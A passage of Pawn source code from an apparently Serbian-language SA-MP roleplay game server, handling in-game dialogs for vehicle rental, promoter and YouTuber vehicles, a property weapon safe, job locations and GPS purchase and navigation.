			  		format( string, sizeof( string ), "(RENT)\n{FFFFFF}%s", ImeIgraca(playerid) );
					VehicleInfo[ RentVozilo[ playerid ] ][ Validv3DText ] = true;
					VehicleInfo[ RentVozilo[ playerid ] ][ v3DText ] = CreateDynamic3DTextLabel(string, 0x008080FF, 0.0, 0.0, -100.0, 15.0, IPI, RentVozilo[ playerid ], 0, -1, -1, -1, 15.0, -1, 0);

					new engine, lights, alarm, doors, bonnet, boot, objective;

				    GetVehicleParamsEx( RentVozilo[ playerid ], engine, lights, alarm, doors, bonnet, boot, objective );
				    SetVehicleParamsEx( RentVozilo[ playerid ], 1, 0, alarm, 0, 0, 0, objective );

      				RentTimer[ playerid ] = SetPlayerTimerEx(playerid, "KrajRenta", 15*60000, false, "i", playerid);

					SendInfoMessage(playerid, "Iznajmili ste Infernus na 15 minuta za $6000.");
				}
			}
	    }
	}
	else if(dialogid == dialog_PROMOTERVEH )
	{
		if( response )
		{
		    switch(listitem)
			{
				case 0:
				{
					PromoterVozilo[ playerid ] = SMG_CreateVehicle(560, 873.9756, -1663.4427, 13.5469, 270.0000, 79, 79, -1 );
					LinkVehicleToInterior( PromoterVozilo[ playerid ], GetPlayerInterior( playerid ) );
			        SetVehicleVirtualWorld( PromoterVozilo[ playerid ], GetPlayerVirtualWorld( playerid ) );
			        ResetVehicle( PromoterVozilo[ playerid ] );
					vCanDrive[ PromoterVozilo[ playerid ] ] = 1;
				    PutPlayerInVehicle( playerid, PromoterVozilo[ playerid ], 0 );
					ResetVehicleStatistics( PromoterVozilo[ playerid ] );

					new string[ 35+MAX_PLAYER_NAME ];
			  		format( string, sizeof( string ), "[ PROMOTER - {FFFFFF}%s {AEFAA2}]", ImeIgraca(playerid) );
					VehicleInfo[ PromoterVozilo[ playerid ] ][ Validv3DText ] = true;
					VehicleInfo[ PromoterVozilo[ playerid ] ][ v3DText ] = CreateDynamic3DTextLabel(string, 0xAEFAA2FF, 0.0, 0.0, -100.0, 7.5, IPI, PromoterVozilo[ playerid ], 0, -1, -1, -1, 7.5, -1, 0);

					new engine, lights, alarm, doors, bonnet, boot, objective;
				    GetVehicleParamsEx( PromoterVozilo[ playerid ], engine, lights, alarm, doors, bonnet, boot, objective );
				    SetVehicleParamsEx( PromoterVozilo[ playerid ], 1, 0, alarm, 0, 0, 0, objective );

				    if(PlayerInfo[playerid][xPromoter] >= 1) SpawnovaoVozilo[playerid] = gettime()+120;
				}
				case 1:
				{
					PromoterVozilo[ playerid ] = SMG_CreateVehicle(579, 873.9756, -1663.4427, 13.5469, 270.0000, 79, 79, -1 );
					LinkVehicleToInterior( PromoterVozilo[ playerid ], GetPlayerInterior( playerid ) );
			        SetVehicleVirtualWorld( PromoterVozilo[ playerid ], GetPlayerVirtualWorld( playerid ) );
			        ResetVehicle( PromoterVozilo[ playerid ] );
					vCanDrive[ PromoterVozilo[ playerid ] ] = 1;
				    PutPlayerInVehicle( playerid, PromoterVozilo[ playerid ], 0 );
					ResetVehicleStatistics( PromoterVozilo[ playerid ] );

					new string[ 35+MAX_PLAYER_NAME ];
			  		format( string, sizeof( string ), "[ PROMOTER - {FFFFFF}%s {AEFAA2}]", ImeIgraca(playerid) );
					VehicleInfo[ PromoterVozilo[ playerid ] ][ Validv3DText ] = true;
					VehicleInfo[ PromoterVozilo[ playerid ] ][ v3DText ] = CreateDynamic3DTextLabel(string, 0xaefaa2FF, 0.0, 0.0, -100.0, 7.5, IPI, PromoterVozilo[ playerid ], 0, -1, -1, -1, 7.5, -1, 0);

					new engine, lights, alarm, doors, bonnet, boot, objective;
				    GetVehicleParamsEx( PromoterVozilo[ playerid ], engine, lights, alarm, doors, bonnet, boot, objective );
				    SetVehicleParamsEx( PromoterVozilo[ playerid ], 1, 0, alarm, 0, 0, 0, objective );

				    if(PlayerInfo[playerid][xPromoter] >= 1) SpawnovaoVozilo[playerid] = gettime()+120;
				}
				case 2:
				{
					PromoterVozilo[ playerid ] = SMG_CreateVehicle(447, 873.9756, -1663.4427, 13.5469, 270.0000, 79, 79, -1 );
					LinkVehicleToInterior( PromoterVozilo[ playerid ], GetPlayerInterior( playerid ) );
			        SetVehicleVirtualWorld( PromoterVozilo[ playerid ], GetPlayerVirtualWorld( playerid ) );
			        ResetVehicle( PromoterVozilo[ playerid ] );
					vCanDrive[ PromoterVozilo[ playerid ] ] = 1;
				    PutPlayerInVehicle( playerid, PromoterVozilo[ playerid ], 0 );
					ResetVehicleStatistics( PromoterVozilo[ playerid ] );

					new string[ 35+MAX_PLAYER_NAME ];
			  		format( string, sizeof( string ), "[ PROMOTER - {FFFFFF}%s {AEFAA2}]", ImeIgraca(playerid) );
					VehicleInfo[ PromoterVozilo[ playerid ] ][ Validv3DText ] = true;
					VehicleInfo[ PromoterVozilo[ playerid ] ][ v3DText ] = CreateDynamic3DTextLabel(string, 0xaefaa2FF, 0.0, 0.0, -100.0, 7.5, IPI, PromoterVozilo[ playerid ], 0, -1, -1, -1, 7.5, -1, 0);

					new engine, lights, alarm, doors, bonnet, boot, objective;
				    GetVehicleParamsEx( PromoterVozilo[ playerid ], engine, lights, alarm, doors, bonnet, boot, objective );
				    SetVehicleParamsEx( PromoterVozilo[ playerid ], 1, 0, alarm, 0, 0, 0, objective );

				    if(PlayerInfo[playerid][xPromoter] >= 1) SpawnovaoVozilo[playerid] = gettime()+120;
				}
				case 3:
				{
					PromoterVozilo[ playerid ] = SMG_CreateVehicle(411, 873.9756, -1663.4427, 13.5469, 270.0000, 79, 79, -1 );
					LinkVehicleToInterior( PromoterVozilo[ playerid ], GetPlayerInterior( playerid ) );
			        SetVehicleVirtualWorld( PromoterVozilo[ playerid ], GetPlayerVirtualWorld( playerid ) );
			        ResetVehicle( PromoterVozilo[ playerid ] );
					vCanDrive[ PromoterVozilo[ playerid ] ] = 1;
				    PutPlayerInVehicle( playerid, PromoterVozilo[ playerid ], 0 );
					ResetVehicleStatistics( PromoterVozilo[ playerid ] );

					new string[ 35+MAX_PLAYER_NAME ];
			  		format( string, sizeof( string ), "[ PROMOTER - {FFFFFF}%s {AEFAA2}]", ImeIgraca(playerid) );
					VehicleInfo[ PromoterVozilo[ playerid ] ][ Validv3DText ] = true;
					VehicleInfo[ PromoterVozilo[ playerid ] ][ v3DText ] = CreateDynamic3DTextLabel(string, 0xaefaa2FF, 0.0, 0.0, -100.0, 7.5, IPI, PromoterVozilo[ playerid ], 0, -1, -1, -1, 7.5, -1, 0);

					new engine, lights, alarm, doors, bonnet, boot, objective;
				    GetVehicleParamsEx( PromoterVozilo[ playerid ], engine, lights, alarm, doors, bonnet, boot, objective );
				    SetVehicleParamsEx( PromoterVozilo[ playerid ], 1, 0, alarm, 0, 0, 0, objective );

				    if(PlayerInfo[playerid][xPromoter] >= 1) SpawnovaoVozilo[playerid] = gettime()+120;
				}
				case 4:
				{
					PromoterVozilo[ playerid ] = SMG_CreateVehicle(451, 873.9756, -1663.4427, 13.5469, 270.0000, 79, 79, -1 );
					LinkVehicleToInterior( PromoterVozilo[ playerid ], GetPlayerInterior( playerid ) );
			        SetVehicleVirtualWorld( PromoterVozilo[ playerid ], GetPlayerVirtualWorld( playerid ) );
			        ResetVehicle( PromoterVozilo[ playerid ] );
					vCanDrive[ PromoterVozilo[ playerid ] ] = 1;
				    PutPlayerInVehicle( playerid, PromoterVozilo[ playerid ], 0 );
					ResetVehicleStatistics( PromoterVozilo[ playerid ] );

					new string[ 35+MAX_PLAYER_NAME ];
			  		format( string, sizeof( string ), "[ PROMOTER - {FFFFFF}%s {AEFAA2}]", ImeIgraca(playerid) );
					VehicleInfo[ PromoterVozilo[ playerid ] ][ Validv3DText ] = true;
					VehicleInfo[ PromoterVozilo[ playerid ] ][ v3DText ] = CreateDynamic3DTextLabel(string, 0xaefaa2FF, 0.0, 0.0, -100.0, 7.5, IPI, PromoterVozilo[ playerid ], 0, -1, -1, -1, 7.5, -1, 0);

					new engine, lights, alarm, doors, bonnet, boot, objective;
				    GetVehicleParamsEx( PromoterVozilo[ playerid ], engine, lights, alarm, doors, bonnet, boot, objective );
				    SetVehicleParamsEx( PromoterVozilo[ playerid ], 1, 0, alarm, 0, 0, 0, objective );

				    if(PlayerInfo[playerid][xPromoter] >= 1) SpawnovaoVozilo[playerid] = gettime()+120;
				}
				case 5:
				{
					PromoterVozilo[ playerid ] = SMG_CreateVehicle(522, 873.9756, -1663.4427, 13.5469, 270.0000, 79, 79, -1 );
					LinkVehicleToInterior( PromoterVozilo[ playerid ], GetPlayerInterior( playerid ) );
			        SetVehicleVirtualWorld( PromoterVozilo[ playerid ], GetPlayerVirtualWorld( playerid ) );
			        ResetVehicle( PromoterVozilo[ playerid ] );
					vCanDrive[ PromoterVozilo[ playerid ] ] = 1;
				    PutPlayerInVehicle( playerid, PromoterVozilo[ playerid ], 0 );
					ResetVehicleStatistics( PromoterVozilo[ playerid ] );

					new string[ 35+MAX_PLAYER_NAME ];
			  		format( string, sizeof( string ), "[ PROMOTER - {FFFFFF}%s {AEFAA2}]", ImeIgraca(playerid) );
					VehicleInfo[ PromoterVozilo[ playerid ] ][ Validv3DText ] = true;
					VehicleInfo[ PromoterVozilo[ playerid ] ][ v3DText ] = CreateDynamic3DTextLabel(string, 0xaefaa2FF, 0.0, 0.0, -100.0, 7.5, IPI, PromoterVozilo[ playerid ], 0, -1, -1, -1, 7.5, -1, 0);

					new engine, lights, alarm, doors, bonnet, boot, objective;
				    GetVehicleParamsEx( PromoterVozilo[ playerid ], engine, lights, alarm, doors, bonnet, boot, objective );
				    SetVehicleParamsEx( PromoterVozilo[ playerid ], 1, 0, alarm, 0, 0, 0, objective );

				    if(PlayerInfo[playerid][xPromoter] >= 1) SpawnovaoVozilo[playerid] = gettime()+120;
				}
				case 6:
				{
					PromoterVozilo[ playerid ] = SMG_CreateVehicle(541, 873.9756, -1663.4427, 13.5469, 270.0000, 79, 79, -1 );
					LinkVehicleToInterior( PromoterVozilo[ playerid ], GetPlayerInterior( playerid ) );
			        SetVehicleVirtualWorld( PromoterVozilo[ playerid ], GetPlayerVirtualWorld( playerid ) );
			        ResetVehicle( PromoterVozilo[ playerid ] );
					vCanDrive[ PromoterVozilo[ playerid ] ] = 1;
				    PutPlayerInVehicle( playerid, PromoterVozilo[ playerid ], 0 );
					ResetVehicleStatistics( PromoterVozilo[ playerid ] );

					new string[ 35+MAX_PLAYER_NAME ];
			  		format( string, sizeof( string ), "[ PROMOTER - {FFFFFF}%s {AEFAA2}]", ImeIgraca(playerid) );
					VehicleInfo[ PromoterVozilo[ playerid ] ][ Validv3DText ] = true;
					VehicleInfo[ PromoterVozilo[ playerid ] ][ v3DText ] = CreateDynamic3DTextLabel(string, 0xaefaa2FF, 0.0, 0.0, -100.0, 7.5, IPI, PromoterVozilo[ playerid ], 0, -1, -1, -1, 7.5, -1, 0);

					new engine, lights, alarm, doors, bonnet, boot, objective;
				    GetVehicleParamsEx( PromoterVozilo[ playerid ], engine, lights, alarm, doors, bonnet, boot, objective );
				    SetVehicleParamsEx( PromoterVozilo[ playerid ], 1, 0, alarm, 0, 0, 0, objective );

				    if(PlayerInfo[playerid][xPromoter] >= 1) SpawnovaoVozilo[playerid] = gettime()+120;
				}
			}
	    }
	}
	else if(dialogid == dialog_YTVEH )
	{
		if( response )
		{
		    switch(listitem)
			{
				case 0:
				{
					YTVozilo[ playerid ] = SMG_CreateVehicle(560, 873.9756, -1663.4427, 13.5469, 270.0000, 3, 3, -1 );
					LinkVehicleToInterior( YTVozilo[ playerid ], GetPlayerInterior( playerid ) );
			        SetVehicleVirtualWorld( YTVozilo[ playerid ], GetPlayerVirtualWorld( playerid ) );
			        ResetVehicle( YTVozilo[ playerid ] );
					vCanDrive[ YTVozilo[ playerid ] ] = 1;
				    PutPlayerInVehicle( playerid, YTVozilo[ playerid ], 0 );
					ResetVehicleStatistics( YTVozilo[ playerid ] );

					new string[ 35+MAX_PLAYER_NAME ];
			  		format( string, sizeof( string ), "[ YOUTUBER - {FFFFFF}%s {DB2C2C}]", ImeIgraca(playerid) );
					VehicleInfo[ YTVozilo[ playerid ] ][ Validv3DText ] = true;
					VehicleInfo[ YTVozilo[ playerid ] ][ v3DText ] = CreateDynamic3DTextLabel(string, 0xDB2C2CFF, 0.0, 0.0, -100.0, 7.5, IPI, YTVozilo[ playerid ], 0, -1, -1, -1, 7.5, -1, 0);

					new engine, lights, alarm, doors, bonnet, boot, objective;
				    GetVehicleParamsEx( YTVozilo[ playerid ], engine, lights, alarm, doors, bonnet, boot, objective );
				    SetVehicleParamsEx( YTVozilo[ playerid ], 1, 0, alarm, 0, 0, 0, objective );

				    SpawnovaoVozilo[playerid] = gettime()+120;
				}
				case 1:
				{
					YTVozilo[ playerid ] = SMG_CreateVehicle(579, 873.9756, -1663.4427, 13.5469, 270.0000, 3, 3, -1 );
					LinkVehicleToInterior( YTVozilo[ playerid ], GetPlayerInterior( playerid ) );
			        SetVehicleVirtualWorld( YTVozilo[ playerid ], GetPlayerVirtualWorld( playerid ) );
			        ResetVehicle( YTVozilo[ playerid ] );
					vCanDrive[ YTVozilo[ playerid ] ] = 1;
				    PutPlayerInVehicle( playerid, YTVozilo[ playerid ], 0 );
					ResetVehicleStatistics( YTVozilo[ playerid ] );

					new string[ 35+MAX_PLAYER_NAME ];
			  		format( string, sizeof( string ), "[ YOUTUBER - {FFFFFF}%s {DB2C2C}]", ImeIgraca(playerid) );
					VehicleInfo[ YTVozilo[ playerid ] ][ Validv3DText ] = true;
					VehicleInfo[ YTVozilo[ playerid ] ][ v3DText ] = CreateDynamic3DTextLabel(string, 0xDB2C2CFF, 0.0, 0.0, -100.0, 7.5, IPI, YTVozilo[ playerid ], 0, -1, -1, -1, 7.5, -1, 0);

					new engine, lights, alarm, doors, bonnet, boot, objective;
				    GetVehicleParamsEx( YTVozilo[ playerid ], engine, lights, alarm, doors, bonnet, boot, objective );
				    SetVehicleParamsEx( YTVozilo[ playerid ], 1, 0, alarm, 0, 0, 0, objective );

				    SpawnovaoVozilo[playerid] = gettime()+120;
				}
				case 2:
				{
					YTVozilo[ playerid ] = SMG_CreateVehicle(447, 873.9756, -1663.4427, 13.5469, 270.0000, 3, 3, -1 );
					LinkVehicleToInterior( YTVozilo[ playerid ], GetPlayerInterior( playerid ) );
			        SetVehicleVirtualWorld( YTVozilo[ playerid ], GetPlayerVirtualWorld( playerid ) );
			        ResetVehicle( YTVozilo[ playerid ] );
					vCanDrive[ YTVozilo[ playerid ] ] = 1;
				    PutPlayerInVehicle( playerid, YTVozilo[ playerid ], 0 );
					ResetVehicleStatistics( YTVozilo[ playerid ] );

					new string[ 35+MAX_PLAYER_NAME ];
			  		format( string, sizeof( string ), "[ YOUTUBER - {FFFFFF}%s {DB2C2C}]", ImeIgraca(playerid) );
					VehicleInfo[ YTVozilo[ playerid ] ][ Validv3DText ] = true;
					VehicleInfo[ YTVozilo[ playerid ] ][ v3DText ] = CreateDynamic3DTextLabel(string, 0xDB2C2CFF, 0.0, 0.0, -100.0, 7.5, IPI, YTVozilo[ playerid ], 0, -1, -1, -1, 7.5, -1, 0);

					new engine, lights, alarm, doors, bonnet, boot, objective;
				    GetVehicleParamsEx( YTVozilo[ playerid ], engine, lights, alarm, doors, bonnet, boot, objective );
				    SetVehicleParamsEx( YTVozilo[ playerid ], 1, 0, alarm, 0, 0, 0, objective );

				    SpawnovaoVozilo[playerid] = gettime()+120;
				}
				case 3:
				{
					YTVozilo[ playerid ] = SMG_CreateVehicle(411, 873.9756, -1663.4427, 13.5469, 270.0000, 3, 3, -1 );
					LinkVehicleToInterior( YTVozilo[ playerid ], GetPlayerInterior( playerid ) );
			        SetVehicleVirtualWorld( YTVozilo[ playerid ], GetPlayerVirtualWorld( playerid ) );
			        ResetVehicle( YTVozilo[ playerid ] );
					vCanDrive[ YTVozilo[ playerid ] ] = 1;
				    PutPlayerInVehicle( playerid, YTVozilo[ playerid ], 0 );
					ResetVehicleStatistics( YTVozilo[ playerid ] );

					new string[ 35+MAX_PLAYER_NAME ];
			  		format( string, sizeof( string ), "[ YOUTUBER - {FFFFFF}%s {DB2C2C}]", ImeIgraca(playerid) );
					VehicleInfo[ YTVozilo[ playerid ] ][ Validv3DText ] = true;
					VehicleInfo[ YTVozilo[ playerid ] ][ v3DText ] = CreateDynamic3DTextLabel(string, 0xDB2C2CFF, 0.0, 0.0, -100.0, 7.5, IPI, YTVozilo[ playerid ], 0, -1, -1, -1, 7.5, -1, 0);

					new engine, lights, alarm, doors, bonnet, boot, objective;
				    GetVehicleParamsEx( YTVozilo[ playerid ], engine, lights, alarm, doors, bonnet, boot, objective );
				    SetVehicleParamsEx( YTVozilo[ playerid ], 1, 0, alarm, 0, 0, 0, objective );

				    SpawnovaoVozilo[playerid] = gettime()+120;
				}
				case 4:
				{
					YTVozilo[ playerid ] = SMG_CreateVehicle(451, 873.9756, -1663.4427, 13.5469, 270.0000, 3, 3, -1 );
					LinkVehicleToInterior( YTVozilo[ playerid ], GetPlayerInterior( playerid ) );
			        SetVehicleVirtualWorld( YTVozilo[ playerid ], GetPlayerVirtualWorld( playerid ) );
			        ResetVehicle( YTVozilo[ playerid ] );
					vCanDrive[ YTVozilo[ playerid ] ] = 1;
				    PutPlayerInVehicle( playerid, YTVozilo[ playerid ], 0 );
					ResetVehicleStatistics( YTVozilo[ playerid ] );

					new string[ 35+MAX_PLAYER_NAME ];
			  		format( string, sizeof( string ), "[ YOUTUBER - {FFFFFF}%s {DB2C2C}]", ImeIgraca(playerid) );
					VehicleInfo[ YTVozilo[ playerid ] ][ Validv3DText ] = true;
					VehicleInfo[ YTVozilo[ playerid ] ][ v3DText ] = CreateDynamic3DTextLabel(string, 0xDB2C2CFF, 0.0, 0.0, -100.0, 7.5, IPI, YTVozilo[ playerid ], 0, -1, -1, -1, 7.5, -1, 0);

					new engine, lights, alarm, doors, bonnet, boot, objective;
				    GetVehicleParamsEx( YTVozilo[ playerid ], engine, lights, alarm, doors, bonnet, boot, objective );
				    SetVehicleParamsEx( YTVozilo[ playerid ], 1, 0, alarm, 0, 0, 0, objective );

				    SpawnovaoVozilo[playerid] = gettime()+120;
				}
				case 5:
				{
					YTVozilo[ playerid ] = SMG_CreateVehicle(522, 873.9756, -1663.4427, 13.5469, 270.0000, 3, 3, -1 );
					LinkVehicleToInterior( YTVozilo[ playerid ], GetPlayerInterior( playerid ) );
			        SetVehicleVirtualWorld( YTVozilo[ playerid ], GetPlayerVirtualWorld( playerid ) );
			        ResetVehicle( YTVozilo[ playerid ] );
					vCanDrive[ YTVozilo[ playerid ] ] = 1;
				    PutPlayerInVehicle( playerid, YTVozilo[ playerid ], 0 );
					ResetVehicleStatistics( YTVozilo[ playerid ] );

					new string[ 35+MAX_PLAYER_NAME ];
			  		format( string, sizeof( string ), "[ YOUTUBER - {FFFFFF}%s {DB2C2C}]", ImeIgraca(playerid) );
					VehicleInfo[ YTVozilo[ playerid ] ][ Validv3DText ] = true;
					VehicleInfo[ YTVozilo[ playerid ] ][ v3DText ] = CreateDynamic3DTextLabel(string, 0xDB2C2CFF, 0.0, 0.0, -100.0, 7.5, IPI, YTVozilo[ playerid ], 0, -1, -1, -1, 7.5, -1, 0);

					new engine, lights, alarm, doors, bonnet, boot, objective;
				    GetVehicleParamsEx( YTVozilo[ playerid ], engine, lights, alarm, doors, bonnet, boot, objective );
				    SetVehicleParamsEx( YTVozilo[ playerid ], 1, 0, alarm, 0, 0, 0, objective );

				    SpawnovaoVozilo[playerid] = gettime()+120;
				}
				case 6:
				{
					YTVozilo[ playerid ] = SMG_CreateVehicle(541, 873.9756, -1663.4427, 13.5469, 270.0000, 3, 3, -1 );
					LinkVehicleToInterior( YTVozilo[ playerid ], GetPlayerInterior( playerid ) );
			        SetVehicleVirtualWorld( YTVozilo[ playerid ], GetPlayerVirtualWorld( playerid ) );
			        ResetVehicle( YTVozilo[ playerid ] );
					vCanDrive[ YTVozilo[ playerid ] ] = 1;
				    PutPlayerInVehicle( playerid, YTVozilo[ playerid ], 0 );
					ResetVehicleStatistics( YTVozilo[ playerid ] );

					new string[ 35+MAX_PLAYER_NAME ];
			  		format( string, sizeof( string ), "[ YOUTUBER - {FFFFFF}%s {DB2C2C}]", ImeIgraca(playerid) );
					VehicleInfo[ YTVozilo[ playerid ] ][ Validv3DText ] = true;
					VehicleInfo[ YTVozilo[ playerid ] ][ v3DText ] = CreateDynamic3DTextLabel(string, 0xDB2C2CFF, 0.0, 0.0, -100.0, 7.5, IPI, YTVozilo[ playerid ], 0, -1, -1, -1, 7.5, -1, 0);

					new engine, lights, alarm, doors, bonnet, boot, objective;
				    GetVehicleParamsEx( YTVozilo[ playerid ], engine, lights, alarm, doors, bonnet, boot, objective );
				    SetVehicleParamsEx( YTVozilo[ playerid ], 1, 0, alarm, 0, 0, 0, objective );

				    SpawnovaoVozilo[playerid] = gettime()+120;
				}
			}
	    }
	}
	else if(dialogid == dialog_PROPERTYWEPTAKE )
	{
	    new wepname[ 32 ];
	    if( response )
	    {
	        switch( listitem )
	        {
	            case 0:
	            {
	                if( II[ PropertySafeGun[ playerid ] ][ iOruzje ][ 0 ] == 0)
	                {
	                    SendErrorMessage( playerid, "Nemate oruzja u tom slotu.");
	                    return 1;
	                }

	                format( wepname, sizeof( wepname ), "%s", WeapNames[ II[ PropertySafeGun[ playerid ] ][ iOruzje ][ 0 ] ] );
	                GiveWeaponToPlayer( playerid, II[ PropertySafeGun[ playerid ] ][ iOruzje ][ 0 ], II[ PropertySafeGun[ playerid ] ][ iMunicija ][ 0 ] );

	                II[ PropertySafeGun[ playerid ] ][ iOruzje ][ 0 ] = 0;
	                II[ PropertySafeGun[ playerid ] ][ iMunicija ][ 0 ] = 0;
	                SaveProperty( PropertySafeGun[ playerid ] );

					SendNearbyMessage(playerid, 5.0, 0xC2A2DAFF, "* %s vadi %s iz sefa.", ImeIgraca( playerid ), wepname );
	            }
	            case 1:
	            {
           	 		if( II[ PropertySafeGun[ playerid ] ][ iOruzje ][ 1 ] == 0)
	                {
	                    SendErrorMessage( playerid, "Nemate oruzja u tom slotu.");
	                    return 1;
	                }

	                format( wepname, sizeof( wepname ), "%s", WeapNames[ II[ PropertySafeGun[ playerid ] ][ iOruzje ][ 1 ] ] );
	                GiveWeaponToPlayer( playerid, II[ PropertySafeGun[ playerid ] ][ iOruzje ][ 1 ], II[ PropertySafeGun[ playerid ] ][ iMunicija ][ 1 ] );

	                II[ PropertySafeGun[ playerid ] ][ iOruzje ][ 1 ] = 0;
	                II[ PropertySafeGun[ playerid ] ][ iMunicija ][ 1 ] = 0;
	                SaveProperty( PropertySafeGun[ playerid ] );

					SendNearbyMessage(playerid, 5.0, 0xC2A2DAFF, "* %s vadi %s iz sefa.", ImeIgraca( playerid ), wepname );
	            }
	            case 2:
	            {
           	 		if( II[ PropertySafeGun[ playerid ] ][ iOruzje ][ 2 ] == 0)
	                {
	                    SendErrorMessage( playerid, "Nemate oruzja u tom slotu.");
	                    return 1;
	                }

	                format( wepname, sizeof( wepname ), "%s", WeapNames[ II[ PropertySafeGun[ playerid ] ][ iOruzje ][ 2 ] ] );
	                GiveWeaponToPlayer( playerid, II[ PropertySafeGun[ playerid ] ][ iOruzje ][ 2 ], II[ PropertySafeGun[ playerid ] ][ iMunicija ][ 2 ] );

	                II[ PropertySafeGun[ playerid ] ][ iOruzje ][ 2 ] = 0;
	                II[ PropertySafeGun[ playerid ] ][ iMunicija ][ 2 ] = 0;
	                SaveProperty( PropertySafeGun[ playerid ] );

					SendNearbyMessage(playerid, 5.0, 0xC2A2DAFF, "* %s vadi %s iz sefa.", ImeIgraca( playerid ), wepname );
				}
				case 3:
	            {
           	 		if( II[ PropertySafeGun[ playerid ] ][ iOruzje ][ 3 ] == 0)
	                {
	                    SendErrorMessage( playerid, "Nemate oruzja u tom slotu.");
	                    return 1;
	                }

	                format( wepname, sizeof( wepname ), "%s", WeapNames[ II[ PropertySafeGun[ playerid ] ][ iOruzje ][ 3 ] ] );
	                GiveWeaponToPlayer( playerid, II[ PropertySafeGun[ playerid ] ][ iOruzje ][ 3 ], II[ PropertySafeGun[ playerid ] ][ iMunicija ][ 3 ] );

	                II[ PropertySafeGun[ playerid ] ][ iOruzje ][ 3 ] = 0;
	                II[ PropertySafeGun[ playerid ] ][ iMunicija ][ 3 ] = 0;
	                SaveProperty( PropertySafeGun[ playerid ] );

					SendNearbyMessage(playerid, 5.0, 0xC2A2DAFF, "* %s vadi %s iz sefa.", ImeIgraca( playerid ), wepname );
				}
	        }
		}
	}
	else if(dialogid == dialog_JOBLIST)
	{
	    if( response )
		{
	        SMG_SetPlayerCheckpoint( playerid, jobsInfos[ listitem ][ jPos ][ 0 ], jobsInfos[ listitem ][ jPos ][ 1 ], jobsInfos[ listitem ][ jPos ][ 2 ], 5.0 );
			CheckpointStatus[ playerid ] = 15;

			SCMF( playerid, 0x36AB00FF, "(POSAO): Lokacija posla {FFFFFF}%s {36AB00}se nalazi na mapi.", jobsInfos[ listitem ][ jName ] );
		}
	}
	else if(dialogid == dialog_BUY_GPS )
	{
 		if( !response ) return 1;

		new requiredMoney = 500,
			gpsLevel = 1;

		SendClientMessage( playerid, ZUTA, "(GPS): Uspesno ste kupili osnovni GPS." );

		switch( listitem )
		{
		    case 0:
			{
		        if( PlayerInfo[ playerid ][ xGpsLevel ] >= 1 ) return SendErrorMessage( playerid, "Vec imate osnovni GPS." );
		    }
			case 1:
			{
		        if( PlayerInfo[ playerid ][ xGpsLevel ] >= 2 ) return SendErrorMessage( playerid, "Vec imate napredni GPS." );

				SendClientMessage( playerid, ZUTA, "(GPS): Uspesno ste kupili napredni GPS." );
				requiredMoney = 5000;
				gpsLevel = 2;
			}
		}

		if( PlayerInfo[ playerid ][ xNovac ] < requiredMoney ) return SendErrorMessage( playerid, "Nemate dovoljno novca." );
		DajIgracuNovac( playerid, -requiredMoney );
		BussinesMoney( uFirmi[ playerid ], requiredMoney / 1, true);

    	PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0 );
		PlayerInfo[ playerid ][ xGpsLevel ] = gpsLevel;
		sql_user_update_integer( playerid, "gps_level", PlayerInfo[ playerid ][ xGpsLevel ] );
	}
	else if(dialogid == dialog_GPS_FIND )
	{
	    pMappedType[ playerid ] = MAPPED_NONE;
	    if( !response ) return 1;

		strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

	    switch( listitem )
		{
	        case 0:
			{
	            pMappedType[ playerid ] = MAPPED_IMPORTANT;
	            foreach(new i : iter_GPS)
				{
					if( gpsInfo[i][gpsSQLID] != 0 )
					{
				    	format( DialogStrgEx, sizeof( DialogStrgEx ), "%s{4282C0}(%d). {FFFFFF}%s\n", DialogStrgEx, i+1, gpsInfo[ i ][ gpsName ] );
					}
				}
				ShowPlayerDialog( playerid, dialog_GPS, DIALOG_STYLE_LIST, "Izaberi lokaciju:", DialogStrgEx, "Potvrdi", "Odustani" );
	        }
			case 1:
			{
			    pMappedType[ playerid ] = MAPPED_HOUSE;
				ShowPlayerDialog( playerid, dialog_GPS, DIALOG_STYLE_INPUT, "Izaberi lokaciju:", "* Unesite id imovine do koje zelite da odete:", "Potvrdi", "Odustani" );
			}
			case 2:
			{
			    pMappedType[ playerid ] = MAPPED_BUSINESS;
			    ShowPlayerDialog( playerid, dialog_GPS, DIALOG_STYLE_INPUT, "Izaberi lokaciju.", "* Unesite id firme do koje zelite da odete:", "Potvrdi", "Odustani" );
			}
			case 3:
			{
				pMappedType[ playerid ] = MAPPED_JOB;
				strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
			    for( new i = 0; i < MAX_JOBS; i++ )
				{
			        format( DialogStrgEx, sizeof( DialogStrgEx ), "%s{4282C0}(%d). {FFFFFF}%s\n", DialogStrgEx, i+1, jobsInfos[ i ][ jName ] );
				}
				ShowPlayerDialog( playerid, dialog_GPS, DIALOG_STYLE_LIST, "Izaberi lokaciju:", DialogStrgEx, "Potvrdi", "Odustani" );
			    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
			}
			case 4: 
			{
	            pMappedType[ playerid ] = MAPPED_QUESTS;
				ShowPlayerDialog( playerid, dialog_GPS, DIALOG_STYLE_LIST, "Izaberi lokaciju:", "{4282C0}(1). {FFFFFF}Misija Transport\n{4282C0}(2). {FFFFFF}Misija Paketic", "Potvrdi", "Odustani" );				
			}
		}
		return 1;
	}
	else if(dialogid == dialog_GPS )
	{
	    if( !response ) return 1;

		switch( pMappedType[ playerid ] )
		{
		    case MAPPED_IMPORTANT:
			{
				setPlayerGps( playerid, gpsInfo[ listitem ][ gpsPos ][ 0 ], gpsInfo[ listitem ][ gpsPos ][ 1 ], gpsInfo[ listitem ][ gpsPos ][ 2 ] );
			}
			case MAPPED_HOUSE:
			{
			    pMappedType[ playerid ] = MAPPED_HOUSE;
			    new broj;
			    if( sscanf( inputtext, "d", broj ) ) return ShowPlayerDialog( playerid, dialog_GPS, DIALOG_STYLE_INPUT, "{FFFFFF}Izaberi lokaciju:", "{FFFFFF}* Unesite id imovine do koje zelite da odete:", "Potvrdi", "Odustani" );
				if( II[broj][iSQLID] == 0 ) return SendErrorMessage( playerid, "ID te imovine ne postoji u bazi podataka!" );
				setPlayerGps( playerid, II[ broj ][ iEnter ][ 0 ], II[ broj ][ iEnter ][ 1 ], II[ broj ][ iEnter ][ 2 ] );
			}
			case MAPPED_JOB:
			{
                setPlayerGps( playerid, jobsInfos[ listitem ][ jPos ][ 0 ], jobsInfos[ listitem ][ jPos ][ 1 ], jobsInfos[ listitem ][ jPos ][ 2 ] );
			}
			case MAPPED_BUSINESS:
			{
			    pMappedType[ playerid ] = MAPPED_BUSINESS;
			    new broj;
